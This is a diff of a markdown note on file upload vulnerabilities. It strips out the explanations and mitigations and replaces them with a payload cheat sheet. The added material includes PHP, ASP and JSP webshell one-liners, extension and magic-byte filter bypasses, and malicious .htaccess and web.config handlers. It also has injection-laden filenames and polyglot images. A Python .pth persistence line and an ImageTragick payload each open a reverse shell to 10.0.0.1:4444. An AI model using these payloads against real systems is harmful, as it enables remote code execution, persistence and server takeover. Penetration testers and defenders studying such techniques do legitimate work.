@@ -1,141 +1,136 @@
 # File Upload Vulnerabilities
 
-Unrestricted file upload allows an attacker to upload arbitrary files to the server —
-most critically, web shells that give direct code execution.
-
----
-
-## Unrestricted File Upload (Webshell)
-
-**Category:** RCE via File Upload
-**Severity context:** Critical — upload a web shell and execute commands on the server.
-
-### How to identify it
-Find any file upload endpoint: profile pictures, document uploads, CSV import, attachment
-features. Attempt to upload a simple text file first. If it succeeds, escalate to
-executable extensions (.php, .asp, .jsp). Check whether the uploaded file is directly
-accessible via a URL.
-
-### How it works
-The application accepts a file and stores it on disk (or in cloud storage) without
-validating the file type, extension, or content. If the file is stored in a web-accessible
-directory and the server executes scripts (e.g. Apache mod_php, Tomcat JSP), the attacker
-can access the uploaded file via HTTP and the server runs its code.
-
-### Exploitation
-```bash
-# Simple PHP web shell
-echo '<?php system($_GET["cmd"]); ?>' > shell.php
-curl -F "file=@shell.php" http://target.com/upload
-curl http://target.com/uploads/shell.php?cmd=id
-
-# More stealthy shell — image polyglot
-# Embed PHP in JPEG comment section
-exiftool -comment='<?php system($_GET["cmd"]); ?>' image.jpg shell.jpg.php
-# Or append PHP bytes to a valid image
-echo '<?php system($_GET["cmd"]); ?>' >> image.jpg
-# Upload as image.jpg.php or image.jpg (if server ignores extension)
-
-# One-liner shells for various languages
-# PHP
-<?php system($_GET['cmd']); ?>
-# ASP
-<% eval request("cmd") %>
-# ASPX
-<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start(Request["cmd"]).StandardOutput.ReadToEnd()); %>
-# JSP
-<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
-# Python (Django/Flask)
-import os; os.system(request.GET['cmd'])
+## Executable Extensions by Platform
+### PHP
 ```
-
-### Example
+.php  .php3  .php4  .php5  .php7  .pht  .phtml  .phar
+.phps  .phpt  .pgif  .phtm  .inc  .shtml
 ```
-Upload request:
-POST /upload HTTP/1.1
-Content-Type: multipart/form-data; boundary=----BOUNDARY
-
-------BOUNDARY
-Content-Disposition: form-data; name="file"; filename="cmd.php"
-Content-Type: application/x-php
-
-<?php system($_GET['cmd']); ?>
-------BOUNDARY--
-
-Access:  GET /uploads/cmd.php?cmd=id
-Result:  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+### ASP / .NET
 ```
-
-### Mitigation
-Validate file extension against an allow-list (never a deny-list). Validate MIME type
-server-side (not from the Content-Type header). Store uploads outside the web root and
-serve them via a script that sets `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`.
-Disable script execution in upload directories via `.htaccess` or nginx config.
-
-### References
-- [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
-- [PortSwigger: File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
-
----
-
+.asp  .aspx  .config  .cer (IIS ≤7.5)  .asa (IIS ≤7.5)
+shell.aspx;1.jpg (IIS <7.0)  .soap
+```
+### JSP
+```
+.jsp  .jspx  .jsw  .jsv  .jspf  .wss  .do  .actions
+```
+### Other
+```
+.cfm  .cfml  .cfc  .pl  .pm  .cgi  .py  .rb  .node  .js
+```
 ## Extension Bypass Techniques
+```
+# Case variation
+shell.PhP  shell.pHp  shell.phtml  shell.pht
 
-**Category:** RCE via File Upload
-**Severity context:** Critical — bypass flawed filters to achieve the same outcome.
+# Double extension
+shell.php.jpg  shell.php.txt  shell.php.png
 
-### How to identify it
-If a basic `.php` upload is blocked, determine the filter type: extension blacklist,
-content-type check, magic byte check, or double extension detection. Test systematically
-to map the filter's exact behavior.
-
-### How it works
-Developers often implement file upload validation as an extension blacklist, MIME-type
-check, or magic-byte check — all of which have well-known bypasses.
-
-### Exploitation
-```bash
-# Case manipulation (if server is case-insensitive)
-shell.PhP   shell.pHp   shell.phtml   shell.pht
-
-# Double extension (Apache handles last extension, some filters check first)
-shell.php.jpg   shell.php.txt
-
-# Trailing dots / spaces (Windows strips them)
-shell.php.   shell.php. .   shell.php._
+# Trailing dots/spaces (Windows strips)
+shell.php.  shell.php. .  shell.php._
 
 # Null byte (older PHP/Apache)
-shell.php%00.jpg
+shell.php%00.jpg  shell.php\x00.png
 
-# Alternate extensions that PHP may execute
-shell.pht   shell.phtml   shell.php5   shell.php7   shell.shtml   shell.inc
+# Reverse double extension (Apache misconfig)
+shell.php.jpg  → executes as PHP if .php anywhere in name
 
-# .htaccess upload — enable arbitrary extension execution
-# Upload an .htaccess file first:
-cat > .htaccess << 'EOF'
-AddType application/x-httpd-php .txt
-EOF
-# Then upload shell.txt with PHP code
+# Special characters
+shell.php%20        # space
+shell.php%0d%0a.jpg # CRLF
+shell.php/          # trailing slash
+shell.php.\         # dot+backslash
+shell.j\sp          # backslash inside
 
-# Content-Type manipulation
-# Change Content-Type from application/x-php to image/jpeg
-
-# Magic byte injection — add image header bytes before PHP code
-shell.php content:
-GIF89a<?php system($_GET['cmd']); ?>
-# GIF89a tricks some magic-byte checks
-
-# SVG upload — XSS via SVG
-cat > shell.svg << 'EOF'
-<?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
-EOF
+# RTLO (Right-to-Left Override)
+name.%E2%80%AEphp.jpg → displays as name.gpj.php
 ```
+## Content-Type / Magic Byte Bypass
+```
+# MIME spoofing
+Content-Type: image/gif
+Content-Type: image/png
+Content-Type: image/jpeg
 
-### Mitigation
-Use extension allow-lists only (e.g. `jpg`, `png`, `gif`, `pdf`). Validate file content
-magic bytes AND extension. Store files with a server-generated filename (never use the
-user-supplied name). Disable `.htaccess` overrides in upload directories.
+# Magic bytes — prepend to PHP shell
+GIF89a<?php system($_GET['cmd']); ?>
+\xff\xd8\xff<?php system($_GET['cmd']); ?>
+\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>
+```
+## .htaccess / web.config Upload
+```
+# Apache — enable PHP execution for any extension
+AddType application/x-httpd-php .rce
+# Then upload shell.rce
 
-### References
-- [PortSwigger: File upload bypass techniques](https://portswigger.net/web-security/file-upload#bypassing-file-upload-filters)
-- [PayloadsAllTheThings: File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
+# IIS — web.config
+<?xml version="1.0" encoding="UTF-8"?>
+<configuration>
+ <system.webServer>
+  <handlers>
+   <add name="shell" path="*.txt" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="None"/>
+  </handlers>
+ </system.webServer>
+</configuration>
+# Then upload shell.txt with ASP code
+```
+## PHP Webshell Variants
+```php
+<?php system($_GET['cmd']); ?>
+<?php passthru($_GET['cmd']); ?>
+<?php exec($_GET['cmd'], $o); foreach($o as $l) echo "$l\n"; ?>
+<?php echo shell_exec($_GET['cmd']); ?>
+<?php eval($_GET['cmd']); ?>
+<?php @eval($_POST['c']); ?>
+<?=`$_GET[cmd]`?>
+<script language="php">system("id");</script>
+<?php system(end($_SERVER['argv'])); ?>
+```
+## Filename Injection
+```
+# Time-based SQLi in filename
+poc.js'(select*from(select(sleep(20)))a)+'.ext
+
+# Path traversal
+../../../tmp/evil.png
+
+# XSS
+'"><img src=x onerror=alert(document.domain)>.ext
+
+# Command injection
+; sleep 10;.png
+```
+## Polyglot — Valid Image + PHP
+```
+# Create a GIF with PHP payload in metadata
+convert -size 110x110 xc:white shell.gif
+exiftool -Comment="<?php system(\$_GET['cmd']); __halt_compiler();" shell.gif
+# Upload shell.gif — still a valid GIF — include via LFI
+
+# JPEG bulletproof
+# Use createBulletproofJPG.py from PayloadsAllTheThings
+```
+## Python .pth Persistence
+```
+# Write to site-packages — executes on every Python startup
+echo 'import socket,os,pty;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' > /usr/local/lib/python3.6/site-packages/persist.pth
+```
+## package.json / composer.json Scripts
+```json
+// package.json
+"scripts": { "prepare": "/bin/touch /tmp/pwned" }
+// composer.json
+"scripts": { "pre-command-run": ["/bin/touch /tmp/pwned"] }
+```
+## ImageTragick (CVE-2016-3714)
+```
+# Upload as .svg or .mvg, triggers RCE via ImageMagick
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/10.0.0.1/4444 0>&1|touch "hello)'
+pop graphic-context
+```
+## References
+- [PayloadsAllTheThings Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
+- [PortSwigger File Upload](https://portswigger.net/web-security/file-upload)
